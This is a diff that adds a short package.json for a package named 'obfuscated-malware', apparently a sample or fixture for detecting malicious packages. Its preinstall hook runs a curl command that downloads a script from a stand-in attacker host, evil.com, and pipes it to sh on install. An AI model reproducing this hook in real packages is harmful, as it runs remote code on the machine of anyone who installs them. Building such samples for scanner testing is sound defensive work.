@@ -1,0 +1,7 @@
+{
+  "name": "obfuscated-malware",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e \"require('child_process').exec('curl http://evil.com/payload.sh | sh')\""
+  }
+}
